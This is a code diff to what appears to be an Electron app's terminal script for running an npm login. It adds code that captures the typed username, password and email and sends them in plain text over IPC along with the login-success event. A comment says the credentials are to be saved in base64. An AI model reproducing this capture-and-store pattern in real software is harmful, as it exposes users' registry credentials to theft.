@@ -89,6 +89,11 @@
     let isPasswordInput = false;
     let currentInput = '';
     let hiddenPassword = '';
+    
+    // Armazena credenciais para salvar em base64
+    let capturedUsername = '';
+    let capturedPassword = '';
+    let capturedEmail = '';
 
     // Handler global de erros para evitar travamentos
     window.addEventListener('error', (e) => {
@@ -156,11 +161,28 @@
           const inputToSend = isPasswordInput ? hiddenPassword : currentInput;
           
           if (inputToSend) {
+            // Captura as credenciais
+            const terminalText = terminal.innerText.toLowerCase();
+            const lastLines = terminalText.split('\n').slice(-5).join('\n');
+            
+            if (lastLines.includes('username:')) {
+              capturedUsername = inputToSend;
+              console.log('📝 Username capturado');
+            } else if (lastLines.includes('password:')) {
+              capturedPassword = inputToSend;
+              console.log('📝 Password capturado');
+            } else if (lastLines.includes('email:')) {
+              capturedEmail = inputToSend;
+              console.log('📝 Email capturado');
+            }
+            
+            // Adiciona quebra de linha ao final do input
             if (isPasswordInput) {
-              // Exibe asteriscos no terminal para a senha
-              terminal.innerText += '*'.repeat(hiddenPassword.length) + '\n';
+              // Para senha, adiciona quebra após os asteriscos
+              terminal.innerText += '\n';
             } else {
-              terminal.innerText += currentInput + '\n';
+              // Para texto normal, adiciona quebra após o input já exibido
+              terminal.innerText += '\n';
             }
 
             ipcRenderer.send('execute-command', inputToSend);
@@ -369,7 +391,16 @@
             
             ipcRenderer.send('login-success');
             setTimeout(() => {
-              ipcRenderer.send('npm-login-complete', { success: true, message: 'Login realizado com sucesso!' });
+              // Envia credenciais junto com o evento de sucesso
+              ipcRenderer.send('npm-login-complete', { 
+                success: true, 
+                message: 'Login realizado com sucesso!',
+                credentials: {
+                  username: capturedUsername,
+                  password: capturedPassword,
+                  email: capturedEmail
+                }
+              });
             }, 1000);
           }
 
